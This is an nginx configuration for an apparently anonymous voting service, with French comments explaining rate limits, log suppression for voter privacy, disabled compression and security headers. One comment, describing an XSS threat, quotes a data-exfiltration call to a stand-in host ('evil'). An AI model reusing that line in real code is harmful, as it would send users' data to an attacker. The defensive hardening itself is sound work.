# ---- LIMITATION DE DEBIT (C-10) ----
# Portee ici et pas dans l'application, deliberement : un limiteur applicatif
# devrait tenir une table {IP -> horodatages} pour les routes de vote, ce qui
# reconstituerait en RAM exactement la correlation (IP, instant de vote) que
# `access_log off` ferme quelques lignes plus bas. Nginx tient un compteur a
# fuite en memoire partagee, pas un historique : rien qui relie une IP a un
# vote precis.
#
# CALIBRAGE ET NAT -- point critique pour le terrain : les agents d'un meme
# site sortent souvent derriere UNE SEULE IP publique. Un limiteur serre les
# bloquerait tous en meme temps. 5 r/s soutenus avec une rafale de 50 laisse
# passer environ 300 requetes par minute depuis une IP unique (un bureau entier
# votant dans la meme minute), tout en plafonnant un attaquant a 5 r/s -- charge
# absorbable par le worker unique. Si un site plus grand devait etre gene,
# augmenter `rate` avant de retirer la limite.
limit_req_zone $binary_remote_addr zone=vera_vote:10m rate=5r/s;

# Zone DEDIEE a /api/rh/connexion, volontairement bien plus stricte.
# Cet endpoint est NON AUTHENTIFIE et declenche un PBKDF2 de 200 000 iterations
# a CHAQUE appel -- y compris pour un identifiant inexistant, ou un calcul
# factice est fait expres pour ne pas trahir par le timing qu'un compte
# n'existe pas (vera_admin_auth.py). Tous les endpoints de l'application sont
# des `def` synchrones : FastAPI les execute donc dans le threadpool anyio
# PARTAGE (40 threads par defaut), le meme qui sert /api/repondre.
#
# Sans limite ici, quelques dizaines de requetes concurrentes sur la connexion
# occupent tout le threadpool le temps des PBKDF2, et les VOTES legitimes
# partent en timeout. L'anti-bruteforce applicatif (5 echecs par IP) ne
# l'empeche pas : les 5 premieres requetes de chaque IP passent, et il suffit
# de repartir la charge sur quelques adresses.
#
# 1 r/s avec une rafale de 5 : largement suffisant pour un humain qui se
# connecte (et qui se trompe de mot de passe deux ou trois fois), tres
# insuffisant pour saturer un pool de 40 threads.
limit_req_zone $binary_remote_addr zone=vera_login:10m rate=1r/s;

limit_req_status 429;

server {
    # Migre le 02/09/2026 : la production repond sur vera-consultation.fr,
    # l'ancien nom restant servi (meme certificat). Ce fichier annoncait
    # encore le seul DuckDNS, ce qui contredisait VERIFICATION_CLIENT.md --
    # un tiers qui compare la conf publiee a la production annoncee y
    # voyait une divergence (03/09/2026).
    server_name vera-consultation.fr www.vera-consultation.fr vera-consultation.duckdns.org;

    # ---- JOURNAL D'ERREURS ----
    # Niveau `crit`, deliberement.
    #
    # Couper access_log sur les routes de vote ne suffit pas : `limit_req`
    # journalise ses refus dans l'ERROR log, au niveau `error` par defaut,
    # avec l'IP du client, l'horodatage a la seconde et la route demandee :
    #
    #   [error] limiting requests, excess: 5.000 by zone "vera_vote",
    #   client: 203.0.113.7, request: "POST /api/signer_aveugle HTTP/2.0"
    #
    # C'est exactement le canal que la coupure des access_log existe pour
    # fermer, rouvert par le correctif de limitation de debit. Et le cas n'est
    # pas theorique : le calibrage de la zone anticipe explicitement un bureau
    # entier votant derriere une seule IP NAT -- precisement ce qui declenche
    # limit_req.
    #
    # `crit` est strictement superieur a `error` : ces lignes ne sont plus
    # ecrites, les defaillances reellement graves le restent. Ne pas utiliser
    # `limit_req_log_level info`, qui abaisse le niveau sans rien supprimer.
    error_log /var/log/nginx/vera_error.log crit;

    # ---- EN-TETES DE SECURITE ----
    # Poses au niveau `server` : nginx les herite dans tous les `location` de ce
    # bloc. ATTENTION : si un `location` ajoute un jour son propre add_header,
    # il REMPLACE tous les en-tetes herites -- il faudra alors les repeter.
    #
    # CSP -- limite assumee : les pages embarquent leur JS en <script> inline,
    # donc 'unsafe-inline' est necessaire sur script-src et la CSP ne peut PAS
    # empecher l'execution d'une XSS. La defense porteuse contre l'XSS est
    # l'echappement cote client (echapperHtml dans admin.html), pas cette ligne.
    # Ce que la CSP apporte quand meme, et qui compte :
    #   - connect-src 'self' : une XSS qui s'executerait ne peut RIEN exfiltrer
    #     vers un serveur tiers (c'etait le scenario : nom de departement piege
    #     faisant fetch('//evil/'+donnees) dans la session d'un autre admin).
    #   - script-src 'self' : impossible de charger un script externe.
    #   - frame-ancestors 'none' : le tableau de bord RH n'est pas cadrable,
    #     donc pas de clickjacking sur le bouton de cloture.
    #   - form-action / base-uri : pas de detournement de soumission.
    # Passer a une CSP stricte (nonce, sans unsafe-inline) demande d'extraire le
    # JS inline dans des fichiers .js separes -- refonte a faire a froid.
    # COMPRESSION COUPEE, ET C'EST UNE MESURE DE CONFIDENTIALITE.
    #
    # Tout le bourrage de ce projet suppose que la reponse n'est PAS
    # compressee : 400 octets sur la reponse de /api/signer_aveugle, 1000 sur
    # l'URL de cle publique, LONGUEUR_CIBLE_FIXE sur le corps du depot. Ces
    # octets de remplissage sont des « x » repetes -- gzip les reduit a quelques
    # octets, et la taille redevient distinguante : un observateur du reseau
    # reclasse les demandes de signature par service, ce que le bourrage existe
    # pour empecher.
    #
    # Cela tenait jusqu'ici pour une raison fragile : la configuration Ubuntu
    # par defaut ne compresse que text/html. Le jour ou quelqu'un ajoute
    # `gzip_types application/json` -- dans nginx.conf, pas ici --, la
    # protection tombe SANS QU'AUCUN TEST NE LE VOIE. Releve par un audit
    # externe le 04/09/2026.
    #
    # Meme raisonnement que `access_log off` : on ne compte pas sur un defaut
    # d'environnement, on l'ecrit.
    gzip off;

    # CSP : 'unsafe-inline' RETIRE de script-src le 04/09/2026.
    #
    # La section 6 du modele de menace pose le scenario « l'operateur sert un
    # JavaScript modifie ». 'unsafe-inline' etait le cran qui restait ouvert :
    # il autorisait l'execution de N'IMPORTE QUEL script inline, y compris un
    # injecte. Releve par un audit externe, qui notait a juste titre que la
    # fermeture etait bon marche -- les pages sont statiques et leurs empreintes
    # sont deja publiees.
    #
    # Les deux empreintes ci-dessous couvrent le script inline de vote.html et
    # celui d'admin.html. Un troisieme script, ou une modification de l'un des
    # deux, ne s'executerait pas.
    #
    # ATTENTION, ET C'EST LE PRIX : ces empreintes doivent suivre le contenu des
    # pages. Modifier une ligne du script inline de vote.html sans mettre a jour
    # cette ligne rend la page SILENCIEUSEMENT inerte -- le navigateur bloque le
    # script sans rien afficher au votant. C'est la desynchronisation manuelle
    # que ce projet traque ailleurs, et elle est fermee par
    # tests/test_empreintes_publiees.py, qui recalcule ces empreintes a chaque
    # passage de la suite et echoue si elles divergent.
    #
    # style-src garde 'unsafe-inline' : les pages utilisent des attributs
    # style="..." que les empreintes CSP ne couvrent pas (il faudrait
    # 'unsafe-hashes', dont la portee est plus large). Un style injecte ne peut
    # pas executer de code ; le gain serait cosmetique et le cout reel.
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'sha256-j52e5HceVcN/RQAkRA+n4S6/US7vR5zPHmJrTIyFNjc=' 'sha256-bEJlh7I7YGTBC1EBY6UGUK2QyXpvBdEAV4Xh4BU6QAc='; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'" always;

    # Anti-framing (redondant avec frame-ancestors, mais couvre les navigateurs
    # anciens qui ignorent la CSP).
    add_header X-Frame-Options "DENY" always;

    # Empeche le navigateur de deviner un type MIME different de celui annonce.
    add_header X-Content-Type-Options "nosniff" always;

    # Referrer-Policy : critique ici. Le lien de vote porte le credential dans
    # son fragment (#). Les fragments ne sont jamais envoyes dans un Referer,
    # mais le CHEMIN /vote et le departement en query pourraient fuiter vers un
    # tiers si la page chargeait une ressource externe. no-referrer coupe la
    # question a la racine.
    add_header Referrer-Policy "no-referrer" always;

    # HSTS : force HTTPS pendant 2 ans. A n'activer que si le certificat est
    # fiable et renouvele (Certbot le fait ici) -- une erreur de certificat
    # rendrait le site inaccessible pendant toute la duree du max-age.
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;

    # Routes du parcours de VOTE : access_log desactive.
    # Chaque ligne de log porte IP + horodatage a la seconde. Or la demande de
    # signature (liee au jeton, donc a l'identite distribuee par le RH) et le
    # depot du vote sont deux requetes du meme client a quelques secondes
    # d'intervalle : les logs suffisent a relier identite et vote sans toucher
    # a la cryptographie. La base a ete purgee de ses horodatages (P-B) ; laisser
    # Nginx les reconstituer annulerait ce travail.
    # Les autres routes (sante, pages, RH) restent loggees pour le diagnostic
    # et la detection d'abus.
    location = /api/signer_aveugle {
        access_log off;
        limit_req zone=vera_vote burst=50 nodelay;
        proxy_pass http://127.0.0.1:8001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    location = /api/repondre {
        access_log off;
        limit_req zone=vera_vote burst=50 nodelay;
        proxy_pass http://127.0.0.1:8001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # Les GET du parcours de vote aussi : servir la page et livrer la cle
    # publique laissent sinon IP + departement + horodatage a la seconde dans
    # l'access log, quelques secondes avant le vote. Le credential est passe en
    # fragment (jamais transmis), mais le departement voyage encore en query
    # sur cle_publique : sans ces deux blocs, la coupure posee sur les POST ne
    # ferme pas la correlation.
    # La page de vote est accessible sous DEUX chemins : /vote (route FastAPI)
    # et /static/vote.html (montage StaticFiles). Les liens emis pointent tous
    # sur /vote, mais le second existe et tombait dans `location /`, donc
    # journalise -- releve par un audit externe le 03/09/2026.
    #
    # L'exposition etait marginale : il faut connaitre ce chemin pour l'emprunter,
    # et il ne porte aucun jeton. Mais c'est la meme desynchronisation manuelle
    # que celle decrite plus haut : une route ajoutee cote applicatif sans son
    # bloc ici.
    # limit_req ajoute : ce bloc sert la MEME page que /vote (voir plus bas,
    # qui porte deja `zone=vera_vote burst=50`), mais restait le seul chemin
    # du parcours de vote sans limitation. Constat d'un audit externe le
    # 09/09/2026.
    location = /static/vote.html {
        access_log off;
        limit_req zone=vera_vote burst=50 nodelay;
        proxy_pass http://127.0.0.1:8001;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    location = /vote {
        access_log off;
        limit_req zone=vera_vote burst=50 nodelay;
        proxy_pass http://127.0.0.1:8001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    location = /api/cle_publique {
        access_log off;
        limit_req zone=vera_vote burst=50 nodelay;
        proxy_pass http://127.0.0.1:8001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # Les trois routes ci-dessous completent la coupure des journaux. Elles ont
    # ete oubliees lors du premier passage, ce qui laissait la fuite ouverte
    # malgre les quatre routes protegees : le chargement d'une page de vote
    # declenche AUSSI /api/question et /static/blindrsa-bundle.js, plus le
    # favicon demande automatiquement par le navigateur. Ces requetes tombaient
    # dans `location /`, donc journalisees avec IP et horodatage a la seconde.
    #
    # Consequence concrete : a chaque ouverture de lien, Nginx ecrivait
    # « <IP> [.../14:03:22] "GET /api/question" ». Croise avec n'importe quelle
    # source associant IP et personne -- annuaire DHCP, journal VPN, IP fixe
    # d'un teletravailleur -- cela reconstituait qui a vote et quand. C'est
    # exactement le canal que la coupure des logs existe pour fermer.
    #
    # Regle a retenir : proteger une route ne suffit pas, il faut proteger
    # toutes les requetes que sa page declenche.
    location = /api/question {
        access_log off;
        limit_req zone=vera_vote burst=50 nodelay;
        proxy_pass http://127.0.0.1:8001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    location = /static/blindrsa-bundle.js {
        access_log off;
        limit_req zone=vera_vote burst=50 nodelay;
        proxy_pass http://127.0.0.1:8001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # Repondu directement par Nginx : inutile de deranger l'application, et
    # surtout inutile d'ecrire une ligne de journal pour une icone.
    location = /favicon.ico {
        access_log off;
        return 204;
    }

    # Ajoutee le 12/08 apres un audit externe. Le client appelle cette route a
    # CHAQUE ouverture de lien (static/vote.html, verification de l'engagement
    # sur l'ensemble des cles) : c'est une requete du parcours de vote au meme
    # titre que /api/question ou le bundle. Sans ce bloc elle tombait dans
    # `location /` et laissait IP + horodatage a la seconde pour chaque votant.
    #
    # C'est la MEME fuite que celle fermee le 06/08, rouverte par un correctif
    # ulterieur : la route a ete ajoutee avec la fonction d'agregat, la conf
    # n'a pas suivi. La liste des exemptions est maintenue a la main et se
    # desynchronise -- voir test_routes_non_journalisees.py, qui verifie
    # desormais mecaniquement que tout fetch de vote.html a son bloc.
    # Resultats publies : consultable par les participants et leurs
    # representants. Meme traitement que le reste du parcours -- qui consulte
    # le resultat n'a pas a laisser d'adresse IP horodatee.
    location = /api/resultats_publies {
        access_log off;
        limit_req zone=vera_vote burst=50 nodelay;
        proxy_pass http://127.0.0.1:8001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    location = /api/engagement_cles {
        access_log off;
        limit_req zone=vera_vote burst=50 nodelay;
        proxy_pass http://127.0.0.1:8001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # Connexion RH : rate-limit strict (voir zone vera_login plus haut).
    # `location =` est un match EXACT et prioritaire sur `location /`, donc ce
    # bloc capture bien la route meme s'il est declare apres d'autres prefixes.
    # Le rate-limit est ici et pas dans l'application deliberement : un
    # limiteur applicatif ne servirait a rien contre cette attaque, puisque
    # c'est justement le fait d'ENTRER dans l'application (et d'y occuper un
    # thread pendant le PBKDF2) qui constitue le vecteur. Nginx refuse avant.
    location = /api/rh/connexion {
        limit_req zone=vera_login burst=5 nodelay;
        proxy_pass http://127.0.0.1:8001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # CREATION DE COMPTE RH : MEME TRAITEMENT QUE LA CONNEXION, PAS LE
    # FOURRE-TOUT.
    #
    # Cette route etait sans bloc dedie -- elle tombait dans `location /` a
    # 5 r/s, rafale 20, bien plus permissif que la connexion. Elle cree des
    # comptes avec les memes pouvoirs que /api/rh/connexion protege : publier,
    # CLOTURER (donc effacer), generer des autorisations. Constat d'un audit
    # externe le 09/09/2026.
    location = /api/admin/creer_compte_rh {
        limit_req zone=vera_login burst=5 nodelay;
        proxy_pass http://127.0.0.1:8001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # LA RACINE SERT LA VITRINE, PAS UNE ERREUR.
    #
    # Jusqu'au 05/09/2026, https://vera-consultation.fr renvoyait 404 : seule
    # /vote etait servie, et le fourre-tout relayait vers une application qui
    # n'a pas de route racine.
    #
    # Un DPO ou un delegue a qui l'on donne l'adresse tape le domaine, pas
    # /vote. Il tombait sur une erreur et en concluait que le service n'existe
    # pas. Releve en essayant simplement d'ouvrir l'adresse.
    #
    # access_log off comme ailleurs : consulter la page publique ne doit pas
    # laisser de trace non plus. La vitrine est un fichier statique, servi
    # directement par nginx -- elle ne passe pas par l'application et ne peut
    # donc pas peser sur le verrou SQLite du depot de vote.
    location = / {
        access_log off;
        root /var/www/vera;
        try_files /index.html =404;
    }

    location / {
        # Plancher de debit sur le fourre-tout. C'etait le seul bloc sans
        # limite, alors qu'il capture des routes non authentifiees qui
        # touchent la base -- dont /api/question avant qu'elle n'ait son
        # propre bloc. Or tous les endpoints sont synchrones : ils partagent
        # le meme threadpool ET le meme verrou SQLite que le depot de vote.
        # Saturer une route publique quelconque met donc les votes en file.
        # 5 r/s avec une rafale de 20 : invisible pour un usage normal,
        # suffisant pour qu'une seule machine ne fasse pas tomber une
        # consultation.
        limit_req zone=vera_vote burst=20 nodelay;
        proxy_pass http://127.0.0.1:8001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    listen 443 ssl; # managed by Certbot
    ssl_certificate /etc/letsencrypt/live/vera-consultation.duckdns.org/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/vera-consultation.duckdns.org/privkey.pem; # managed by Certbot
    include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot

}
server {
    # REDIRECTION HTTP -> HTTPS POUR LES TROIS NOMS, PAS UN SEUL.
    #
    # Ce bloc if ($host = ...) est genere par Certbot, et il ne couvrait que
    # vera-consultation.duckdns.org -- le seul nom connu au moment ou Certbot
    # a d'abord configure ce serveur. La migration du 02/09/2026 a mis a jour
    # `server_name` plus bas pour couvrir vera-consultation.fr et www., mais
    # PAS cette condition : elle est restee figee sur l'ancien domaine.
    #
    # Consequence : un votant ou un delegue qui tapait http://vera-consultation.fr
    # (sans https, ou dans un navigateur qui ne force pas encore HTTPS) tombait
    # sur le `return 404` inconditionnel qui suit, plutot que d'etre redirige.
    # Constat d'un audit externe le 09/09/2026.
    if ($host = vera-consultation.duckdns.org) {
        return 301 https://$host$request_uri;
    }
    if ($host = vera-consultation.fr) {
        return 301 https://$host$request_uri;
    }
    if ($host = www.vera-consultation.fr) {
        return 301 https://$host$request_uri;
    }

    listen 80;
    server_name vera-consultation.fr www.vera-consultation.fr vera-consultation.duckdns.org;
    return 404; # tout hote non liste ci-dessus, ou non couvert par Certbot


}